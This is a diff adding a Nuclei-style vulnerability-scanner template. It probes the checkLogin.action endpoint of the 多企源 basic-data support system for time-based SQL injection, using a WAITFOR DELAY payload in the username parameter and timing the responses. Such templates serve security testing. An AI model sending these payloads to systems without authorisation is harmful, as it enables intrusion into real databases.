@@ -1,0 +1,57 @@
+id: duoqiyuan-checklogin-sqli
+info:
+  name: 多企源-基础数据支撑系统 checkLogin SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in 多企源-基础数据支撑系统 allowing unauthorized access or modification of database data.
+
+variables:
+  t1: '{{rand_int(5,9)}}'
+  t2: '{{to_number(t1)+4}}'
+  t3: '{{rand_int(1,3)}}'
+  t4: '{{to_number(t3)+4}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: step1
+    method: POST
+    path:
+      - "{{BaseURL}}/json/checkLogin.action?usercfg.username=1%27;WAITFOR%20DELAY%20%270:0:{{t1}}%27--"
+    extractors:
+      - type: dsl
+        dsl:
+          - 'duration'
+        internal: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "用户名或密码不正确"
+      - type: dsl
+        dsl:
+          - 'duration >= to_number(t1) && duration <= to_number(t2)'
+
+  - id: step2
+    method: POST
+    path:
+      - "{{BaseURL}}/json/checkLogin.action?usercfg.username=1%27;WAITFOR%20DELAY%20%270:0:{{t3}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "用户名或密码不正确"
+      - type: dsl
+        dsl:
+          - 'duration >= to_number(t3) && duration <= to_number(t4)'
+          - 'to_number(get_extracted_value("duration")) - duration >= 2'
